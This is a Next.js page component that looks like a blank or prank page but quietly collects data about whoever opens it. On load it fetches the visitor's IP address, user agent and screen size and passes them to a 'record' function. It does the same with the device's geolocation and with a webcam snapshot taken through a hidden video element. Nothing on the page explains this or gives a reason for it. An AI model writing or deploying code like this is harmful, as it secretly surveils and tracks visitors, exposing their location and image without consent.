'use client'

import { useEffect, useState, useRef } from "react";
import record from "./record";

export default function Home() {
  const [showJumpScare, setShowJumpScare] = useState(false);

  useEffect(() => {
    // const timer = setTimeout(() => {
    //   setShowJumpScare(true);
    //   // Play the jump scare sound
    //   const audio = new Audio('/sound.mp3');
    //   audio.play();
    // }, 5000); // Jump scare after 5 seconds

    // return () => clearTimeout(timer);
  }, []);


  useEffect(() => {
    (async () => {
      const ip = await (await fetch("https://api.ipify.org/?format=text")).text()
      const additional = {}
      additional["ip"] = ip
      additional["userAgent"] = navigator.userAgent
      additional["screenResolution"] = `${window.innerWidth}x${window.innerHeight}`
      additional["navigator"] = navigator
      record(JSON.stringify(additional))
      console.log(ip)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          record(JSON.stringify([position]))

        });
      } else {
        console.log("Geolocation is not supported by this browser.");
      }

      
    })()
    
  }, []);
  const accessCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }
      });

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
    } catch (error) {
      console.error("Error accessing the camera: ", error);
    }
  };

  const videoRef = useRef(null);

  useEffect(() => {
    accessCamera();
    const timer = setTimeout(() => {
      const canvas = document.createElement('canvas');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      canvas.getContext('2d').drawImage(videoRef.current, 0, 0);
      
      const base64 = canvas.toDataURL('image/jpeg');
      record(JSON.stringify({image: base64})) 
      console.log(base64)

    }, 1000);

    return () => clearTimeout(timer);
  }, []);

  
  return (
    <main className="">
 <video ref={videoRef} autoPlay playsInline hidden/>
    </main>
  );
}
